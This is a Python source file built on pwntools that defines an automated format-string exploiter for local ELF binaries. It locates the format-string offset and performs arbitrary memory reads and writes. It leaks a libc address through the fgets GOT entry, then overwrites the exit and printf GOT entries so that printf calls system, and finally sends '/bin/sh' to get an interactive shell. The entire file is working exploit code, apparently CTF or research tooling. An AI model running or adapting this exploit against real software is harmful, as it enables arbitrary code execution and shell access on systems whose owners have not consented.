from pwn import *
from subprocess import Popen, PIPE, check_output

context.log_level = 'DEBUG'


class FmtExploiter:
    def __init__(self, binary, vuln_details):
        self.binary = binary
        context.binary = self.binary.elf
        self.output = b""
        self.last_output = b""
        self.exploit_input = []
        self.position = 0
        self.length = 0
        self.fmt_offset = None
        self.parse_vuln(vuln_details)

    def parse_vuln(self, vuln_details):
        print(vuln_details)
        self.position = vuln_details["position"]
        self.length = vuln_details["length"]
        self.exploit_input = vuln_details["input"]
        self.output = vuln_details["output"]

    def send_payload_find_offset(self, payload):
        process = self.binary.elf.process()
        self.apply_exploit_input(process, payload)
        output = process.clean()
        return output

    def find_fmt_offset(self):
        fmt = FmtStr(self.send_payload_find_offset, numbwritten=self.position)
        return fmt.offset

    def apply_fmt_with_system(self):
        proc = self.binary.elf.process()
        # process = gdb.debug(self.binary.bin_path, '''break main''')
        payload = fmtstr_payload(self.fmt_offset, {self.binary.elf.got['exit']: self.binary.elf.entry},
                                 numbwritten=self.position)
        self.apply_exploit_input(proc, payload)

        payload = fmtstr_payload(self.fmt_offset, {self.binary.elf.got['printf']: self.binary.find_function('system')},
                                 numbwritten=self.position)
        self.apply_exploit_input(proc, payload)

        self.apply_exploit_input(proc, b"/bin/sh\n")

        proc.interactive()

    def apply_fmt1(self):
        self.fmt_offset = self.find_fmt_offset() if self.fmt_offset is None else self.fmt_offset

        proc = self.binary.elf.process()
        # process = gdb.debug(self.binary.bin_path, '''break vuln''')
        self.arbitrary_write({self.binary.elf.got['exit']: self.binary.elf.entry}, proc)
        print("fgets got addr:", self.binary.elf.got['fgets'])

        self.arbitrary_read(self.binary.elf.got['fgets'], proc)

        self.arbitrary_write({self.binary.elf.got['printf']: self.binary.find_function('system', True)}, proc)

        self.apply_exploit_input(proc, b"/bin/sh\n")

        proc.interactive()

    def arbitrary_read(self, address, proc=None):
        self.fmt_offset = self.find_fmt_offset() if self.fmt_offset is None else self.fmt_offset
        # self.fmt_offset = 10
        off_fmt = '|%{}$s|'.format(self.fmt_offset + 1).encode()
        payload = flat(
            off_fmt.rjust(context.bytes),
            pack(address).ljust(context.bytes)
        )
        proc = self.binary.elf.process() if proc is None else proc
        self.apply_exploit_input(proc, payload)

        data = proc.clean()
        print("data:", data)

        leak_bytes = data.split(b'|')[1].rstrip().ljust(context.bytes, b'\x00')
        leak = unpack(leak_bytes)
        self.binary.adjust_libc_base(leak, 'fgets')
        # process.interactive()

    def arbitrary_write(self, write_dict, proc=None):
        self.fmt_offset = self.find_fmt_offset() if self.fmt_offset is None else self.fmt_offset
        proc = self.binary.elf.process() if proc is None else proc
        payload = fmtstr_payload(self.fmt_offset, write_dict, numbwritten=self.position)
        self.apply_exploit_input(proc, payload)
        proc.clean()

    def trim_input(self, input):
        input = input.replace(b'\x00', b'')
        ip = b"F" * self.binary.elf.bytes
        chain_length = len(input)
        log.info("total payload length: {}".format(chain_length))
        offset = input.index(ip)
        log.info("buffer offset: {}".format(offset))
        return input[0:offset]

    def apply_exploit_input(self, proc, payload, exploit_input=None):
        exploit_input = self.exploit_input if exploit_input is None else exploit_input
        current_output = b""
        for input in exploit_input:
            current_output += proc.clean()
            ip = b"F" * self.binary.elf.bytes
            if ip not in input:
                proc.send(input)
            else:
                exploit_payload = flat(
                    self.trim_input(input),
                    payload
                )
                proc.sendline(exploit_payload)

        log.info("current output: {}".format(current_output))
